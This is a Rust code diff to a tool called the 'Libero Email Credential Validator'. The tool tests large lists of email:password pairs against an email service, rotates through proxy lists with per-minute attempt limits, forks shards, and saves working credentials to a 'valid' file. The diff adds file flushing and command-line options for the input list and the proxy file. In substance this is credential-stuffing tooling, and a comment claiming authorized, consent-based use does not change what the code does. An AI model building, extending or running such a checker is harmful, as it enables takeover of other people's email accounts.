@@ -769,14 +769,17 @@ fn create_consumer(
                 stats.valid.fetch_add(1, Ordering::Relaxed);
                 let mut file = valid_f.lock();
                 writeln!(file, "{}:{}", email, pwd).ok();
+                file.flush().ok();
             } else if net_err {
                 stats.errors.fetch_add(1, Ordering::Relaxed);
                 let mut file = error_f.lock();
                 writeln!(file, "{}:{}", email, pwd).ok();
+                file.flush().ok();
             } else {
                 stats.invalid.fetch_add(1, Ordering::Relaxed);
                 let mut file = invalid_f.lock();
                 writeln!(file, "{}:{}", email, pwd).ok();
+                file.flush().ok();
             }
         }
     })
@@ -901,6 +904,12 @@ struct Cli {
     /// Proxy attempts per minute
     #[arg(long = "ppm")]
     ppm: Option<u32>,
+    /// Input file
+    #[arg(short = 'i', long = "input")]
+    input: Option<String>,
+    /// Proxy list file
+    #[arg(short = 'p', long = "proxies")]
+    proxies: Option<String>,
     /// Shards (fork processes)
     //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
     //Key legitimate use cases include:
@@ -950,6 +959,12 @@ fn merge_cfg(cli: Cli) -> Config {
     }
     if let Some(rf) = cli.refresh {
         cfg.refresh = rf.max(0.016);
+    }
+    if let Some(inp) = cli.input {
+        cfg.input_file = inp;
+    }
+    if let Some(px) = cli.proxies {
+        cfg.proxy_file = px;
     }
     if cli.shards == 1 {
         cfg.shards = 3;
